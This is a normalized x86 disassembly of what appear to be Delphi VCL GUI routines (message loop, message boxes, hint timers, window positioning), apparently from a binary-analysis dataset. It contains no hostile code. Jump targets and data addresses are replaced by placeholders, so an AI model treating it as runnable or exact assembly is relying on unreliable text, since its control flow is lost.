cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_453e1c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403370
test al al
jne r-xdata
sub_46d930
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_46d890
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46d788
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46d7d8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46d764
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46d9c8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46d930
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46e298
sub_46d9ec
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418288
mov eax 0x8
call sub_4026f4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_41814c
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46da48
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4182a8
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_402714
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418198
jmp r-xdata
sub_46dadc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_40363c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_453df8
mov [ esi + 0x44 ] edi
sub_46db5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46dc3a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_464938
call sub_407c60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dc41
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_468250
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_40363c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46d9c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_467158
mov eax [ ebp - 0x4 ]
call sub_46d52c
jmp r-xdata
sub_46dc5c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_402784
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_4027a4
push eax
call sub_402784
pop edx
call sub_40b644
call sub_402784
mov edx [ rw-data ]
call sub_403300
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_402784
mov edx eax
mov eax ebx
call sub_46de54
pop esi
pop ebx
retn
call sub_402784
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46dcec
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_4649c0
mov [ ebp - 0x10 ] eax
call sub_4648dc
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_46cc90
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46de41
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46de48
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_464a74
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4648e4
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46de54
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_4038f0#2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403f84
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46d718
mov eax [ ebp - 0x108 ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
mov edx eax
mov eax ebx
pop ecx
call sub_46dcec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df16
lea eax [ ebp - 0x108 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
call sub_408420
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c74
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a8c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b4
sub_46df2c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_453fb8
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_454120
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46e5d0
test al al
je r-xdata
call sub_453e1c
mov ebp eax
mov eax edi
call sub_453e1c
mov ebp eax
mov eax esi
call sub_46e5d0
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46e094
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46e0ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46e5d0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46ee1c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e0f3
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_46e0fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46e154
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46e5d0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46ee1c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e15b
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_46e16c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403174
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44d7d4
jmp r-xdata
sub_46e1bc
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46b768
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46b754
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46e220
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44bee0
mov edi eax
call sub_44a7dc
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44e7e8
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44e7e8
sub_46e298
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e3a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46e220
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46c2d0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_44a798
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46e458
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_40363c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46e7f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46e1bc
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420828
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e3af
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46e3b8
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46b74c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46b738
movzx edx di
xor ecx ecx
call sub_44e7e8
inc esi
dec ebx
jne r-xdata
sub_46e3f4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46d510
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46d510
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46e3b8
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46e458
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4042f8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f40
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447308
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a11c
xor eax eax
push ebp
push sub_46e4dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46e4ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46e548
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46b74c
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46e4ec
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46b738
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46e4ec
pop ecx
jmp r-xdata
mov eax ebx
call sub_454120
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_453e1c
push eax
call IsChild
test eax eax
jne r-xdata
sub_46e5d0
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405758
call sub_42a86c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46e5f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46e63c
push sub_46c328
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46e7f0
sub_46e664
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406a9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44d14c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_44bee0
call sub_46c308
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46e7f0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406a9c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44d14c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46e7f0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46e5f8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44e7e8
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46ea88
jmp r-xdata
sub_46e774
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46e63c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46ea88
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46e7ac
jmp r-xdata
sub_46e7ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_453e1c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_453e1c
push eax
call ShowWindow
sub_46e7f0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46e7ac
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_46c490
mov eax ebx
call sub_46e63c
sub_46e828
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46e96a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425cec
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407c14
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46e93b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425da4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e942
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46e818
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46e818
mov [ ebp - 0x4 ] eax
sub_46e942
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46e97c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403174
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4030bc
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46e9dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46ea76
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea7d
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_403fdc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4248d0
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c2f0
mov ebx eax
inc ebx
sub_46ea88
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
